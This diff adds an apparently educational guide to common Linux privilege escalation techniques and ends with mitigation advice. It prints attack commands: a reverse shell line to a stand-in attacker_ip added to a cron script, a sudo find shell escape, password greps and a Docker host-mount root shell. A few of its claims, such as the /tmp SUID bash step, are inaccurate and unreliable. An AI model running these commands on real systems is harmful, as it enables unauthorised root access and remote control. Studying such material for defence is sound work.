@@ -1,0 +1,124 @@
+Privilege escalation in Linux refers to gaining higher access or permissions than initially granted, usually from a standard user to root or administrative access. Attackers often exploit system misconfigurations, vulnerabilities, or mistakes in the environment to escalate their privileges. Here are some of the simplest and most common methods of privilege escalation in Linux:
+
+1. Sudo Misconfigurations
+Misconfigurations in the sudo command are one of the most common ways attackers can escalate privileges.
+
+Sudo with No Password: If a user is allowed to run specific commands without entering a password (via the NOPASSWD option in the /etc/sudoers file), they can potentially escalate their privileges by running commands as root.
+
+Example of a misconfigured /etc/sudoers:
+
+user ALL=(ALL) NOPASSWD: ALL
+
+In this case, the user can run any command with sudo without needing to supply a password:
+
+sudo su
+
+Running Specific Commands as Root: Sometimes users are allowed to run specific commands as root. If one of these commands can be exploited (e.g., invoking a shell), privilege escalation is possible.
+
+user ALL=(ALL) NOPASSWD: /bin/cat, /usr/bin/find
+
+With this configuration, the user can use the find command to escalate privileges:
+
+sudo find / -exec /bin/sh \; -quit
+
+2. SUID (Set User ID) Files
+SUID files are executables that run with the permissions of the file owner, typically root, regardless of who executes them. If an attacker can find a vulnerable SUID binary, they may be able to escalate privileges.
+
+Finding SUID Files: To list all SUID binaries on the system, use:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Example of Exploiting a SUID Binary: A vulnerable binary with the SUID bit set might allow attackers to spawn a root shell. For instance, if /usr/bin/vulnerable_app is misconfigured, it might allow privilege escalation if the app calls system commands insecurely.
+
+Exploiting Common SUID Binaries: Some legitimate binaries like /usr/bin/passwd or /bin/mount are SUID. These binaries might be exploitable if used inappropriately:
+
+sudo /bin/mount /dev/sda1 /mnt
+
+3. Writable /etc/passwd or /etc/shadow
+If /etc/passwd or /etc/shadow is writable by non-root users, it can lead to privilege escalation.
+
+Modifying /etc/passwd: In older Linux systems, user passwords were stored in /etc/passwd. If this file is writable, an attacker could modify the password field for the root account.
+
+openssl passwd -1 mynewpassword  # Generate a new password hash
+# Then edit /etc/passwd to replace root's password hash
+
+Modifying /etc/shadow: If the more secure /etc/shadow file is writable, an attacker can directly replace the root user’s password hash.
+
+4. Exploiting Weak File Permissions
+If important configuration files, binaries, or scripts are writable by non-root users, attackers can modify them to escalate privileges.
+
+Writable System Binaries: If system binaries (like /bin/su or /bin/bash) are writable, an attacker can replace them with a malicious version. For example:
+
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash  # Set the SUID bit to root
+
+Now running /tmp/bash will give root privileges.
+
+Writable Scripts: If system-wide scripts that are executed with higher privileges (e.g., by cron jobs or services) are writable, attackers can modify these scripts to run malicious code as root.
+
+5. Cron Jobs and Weak Permissions
+If cron jobs are misconfigured or the scripts they call are insecure, attackers can exploit them for privilege escalation.
+
+Writable Cron Jobs: If a cron job script or its directory is writable, an attacker can modify the script to run malicious commands as root.
+
+For example, if a root user has a cron job like this:
+
+* * * * * /usr/local/bin/backup.sh
+And /usr/local/bin/backup.sh is writable by a normal user:
+
+echo "/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1" >> /usr/local/bin/backup.sh
+The next time the cron job runs, the attacker gains root privileges.
+
+Wildcard Injection in Cron Jobs: If a cron job uses wildcards (*) in commands like tar, chown, or chmod, attackers can place files with special names (e.g., --checkpoint=1 --checkpoint-action=exec=/bin/sh) in the directory and inject their own commands when the cron job runs.
+
+6. Kernel Exploits
+Vulnerabilities in the Linux kernel itself can allow for privilege escalation. Attackers can use publicly available exploit code to take advantage of these vulnerabilities, which are usually patched in newer kernel versions.
+
+Exploiting an Old Kernel: If the system is running an outdated kernel with known vulnerabilities (e.g., the Dirty COW vulnerability - CVE-2016-5195), an attacker can compile and execute an exploit to gain root access.
+
+Example of checking kernel version:
+
+uname -r
+Attackers can then search for exploits that match the kernel version.
+
+7. Misconfigured PATH Environment
+If the system’s PATH environment variable is misconfigured (e.g., it includes . or any writable directory before system paths like /bin), attackers can place malicious binaries in those directories that will be executed instead of legitimate system binaries.
+
+export PATH=.:$PATH
+
+And an administrator runs a command like ls, the attacker can create a malicious version of ls in the current directory:
+
+echo "/bin/bash" > ./ls
+chmod +x ./ls
+
+The next time the ls command is run, the attacker gets a shell.
+
+8. NFS (Network File System) Misconfiguration
+If NFS shares are mounted with the no_root_squash option, it allows root on the client system to act as root on the NFS server. This can lead to privilege escalation.
+
+Exploiting NFS: If an attacker can access an NFS share with no_root_squash, they can create a root-owned file, mount it on their machine, and execute it as root on the server.
+
+9. Password Reuse and Credential Hunting
+If users or administrators use weak or reused passwords, attackers may find credentials in various locations on the system and escalate privileges.
+
+Searching for Passwords: Attackers might search for stored passwords in configuration files, scripts, or even memory dumps.
+
+grep -i 'password' /etc/* 2>/dev/null
+grep -i 'password' ~/.* 2>/dev/null
+
+SSH Keys: Attackers may also look for private SSH keys (~/.ssh/id_rsa) that can allow them to log in as other users, including root.
+
+10. Exploiting Docker Misconfigurations
+If a user has access to the Docker group (docker), they can potentially escalate privileges by running a container with root privileges on the host system.
+
+Exploiting Docker: A user with Docker access can mount the host filesystem into a container and get a root shell:
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
+
+Mitigating Privilege Escalation Risks
+Regularly patch the system and kernel to fix vulnerabilities.
+Harden sudo configurations (avoid NOPASSWD and unnecessary root privileges).
+Secure file permissions (especially on sensitive files like /etc/passwd and SUID binaries).
+Regularly audit system configurations (including cron jobs, Docker, and PATH).
+Use tools like Lynis or OSSEC to monitor for misconfigurations and weaknesses.
+By understanding these common methods, you can better protect your Linux systems from privilege escalation attacks.
